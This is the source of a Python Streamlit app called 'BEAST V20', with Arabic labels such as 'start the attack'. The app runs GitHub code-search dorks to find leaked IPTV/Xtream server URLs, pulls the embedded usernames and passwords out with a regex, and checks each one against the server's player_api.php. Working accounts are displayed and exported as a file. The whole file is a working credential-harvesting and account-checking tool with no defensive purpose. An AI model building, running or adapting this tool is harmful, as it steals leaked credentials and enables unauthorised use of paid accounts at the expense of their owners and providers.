import streamlit as st
import requests
import re
import time
from datetime import datetime

# =================================================
# 1. نظام الدخول والهوية
# =================================================
LOGIN_PASS = "BEAST_V17_PRO"

if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

def login():
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V20 - PREDATOR</h1>", unsafe_allow_html=True)
    p = st.text_input("Password:", type="password")
    if st.button("تنشيط النظام"):
        if p == LOGIN_PASS:
            st.session_state.authenticated = True
            st.rerun()
        else: st.error("❌ كلمة المرور خاطئة")

if not st.session_state.authenticated:
    login()
    st.stop()

# =================================================
# 2. الواجهة وتنسيق الهكرز
# =================================================
st.set_page_config(page_title="Beast V20 - Live Radar", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #050505; }
    .radar-box { 
        background: #000; border: 1px solid #1e90ff; padding: 10px; 
        border-radius: 5px; font-family: 'Courier New'; color: #1e90ff;
        margin-bottom: 20px; box-shadow: 0 0 10px #1e90ff;
    }
    .hit-card {
        background: linear-gradient(90deg, #0d1117 0%, #000000 100%);
        border-right: 5px solid #00ff41; border-radius: 10px;
        padding: 15px; margin-bottom: 10px; border: 1px solid #30363d;
    }
    .label { color: #fbbf24; font-weight: bold; }
    .val { color: #ffffff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# إدارة الذاكرة
if 'hits' not in st.session_state: st.session_state.hits = []
if 'hunting' not in st.session_state: st.session_state.hunting = False
if 'stats' not in st.session_state: st.session_state.stats = {"count": 0, "found": 0}

# =================================================
# 3. محرك الفحص والتحقق
# =================================================
def check_server(h, u, p):
    try:
        url = f"{h}/player_api.php?username={u}&password={p}"
        r = requests.get(url, timeout=4).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {
                "h": h, "u": u, "p": p, "exp": exp,
                "con": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}"
            }
    except: return None
    return None

# =================================================
# 4. لوحة التحكم الجانبية
# =================================================
with st.sidebar:
    st.markdown("<h2 style='color:#00ff41;'>BEAST V20</h2>", unsafe_allow_html=True)
    token = st.text_input("GitHub API Token:", type="password")
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 بدء الهجوم"):
            if token: st.session_state.hunting = True; st.rerun()
    with col2:
        if st.button("🛑 إيقاف"):
            st.session_state.hunting = False; st.rerun()

    st.divider()
    st.metric("💎 شغال (ACTIVE)", st.session_state.stats["found"])
    st.metric("🔍 فحص مباشر", st.session_state.stats["count"])
    
    if st.session_state.hits:
        data = "\n".join([f"HOST: {x['h']} | USER: {x['u']} | PASS: {x['p']} | EXP: {x['exp']}" for x in st.session_state.hits])
        st.download_button("📥 تحميل النتائج", data, "Beast_V20_Hits.txt")

# =================================================
# 5. منطقة العرض (الرادار + النتائج)
# =================================================
st.markdown("### 📡 الرادار المباشر (يتم الفحص الآن...)")
radar_display = st.empty() # هذه هي الشاشة التي ستعرض الفحص المباشر

st.markdown("### 🏆 صيد الوحش (Active Servers)")
hits_display = st.container()

# عرض النتائج القديمة فوراً
with hits_display:
    for h in st.session_state.hits:
        st.markdown(f"""
        <div class="hit-card">
            <span style="color:#00ff41; font-weight:bold;">✅ SERVER ONLINE</span><br>
            <span class="label">Host:</span> <span class="val">{h['h']}</span><br>
            <span class="label">User:</span> <span class="val">{h['u']}</span> | <span class="label">Pass:</span> <span class="val">{h['p']}</span><br>
            <span class="label">Expiry:</span> <span style="color:#00ff41;">{h['exp']}</span> | <span class="label">Conn:</span> <span class="val">{h['con']}</span>
        </div>
        """, unsafe_allow_html=True)

# تشغيل عملية البحث
if st.session_state.hunting:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # دروكات مليونية شاملة
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'iptv xtream 2026 server',
        '"http://" "user" "pass" "port" extension:txt',
        'filename:iptv.txt "http"',
        'filename:xtream.txt "username"',
        'path:accounts "http" "password"'
    ]

    while st.session_state.hunting:
        for dork in dorks:
            if not st.session_state.hunting: break
            
            for page in range(1, 101): # البحث في 100 صفحة (مليونية)
                if not st.session_state.hunting: break
                
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    res = requests.get(url, headers=headers).json()
                    
                    if "items" not in res:
                        radar_display.markdown(f'<div class="radar-box">⚠️ GitHub Rate Limit! Resting 30s...</div>', unsafe_allow_html=True)
                        time.sleep(30); continue

                    for item in res['items']:
                        if not st.session_state.hunting: break
                        raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            content = requests.get(raw, timeout=3).text
                            matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                            
                            for m in matches:
                                host, user, pw = m[0], m[1], m[2]
                                
                                # تحديث الرادار المباشر (الفحص الذي يتم حالياً)
                                st.session_state.stats["count"] += 1
                                radar_display.markdown(f"""
                                <div class="radar-box">
                                    📡 SCANNING: <span style="color:#fff;">{host}</span><br>
                                    👤 USER: {user} | 🗝️ PASS: {pw}
                                </div>
                                """, unsafe_allow_html=True)
                                
                                result = check_server(host, user, pw)
                                if result:
                                    st.session_state.hits.insert(0, result)
                                    st.session_state.stats["found"] += 1
                                    st.rerun() # تحديث الصفحة فوراً لعرض النتيجة الجديدة
                        except: continue
                except: continue
                time.sleep(1)
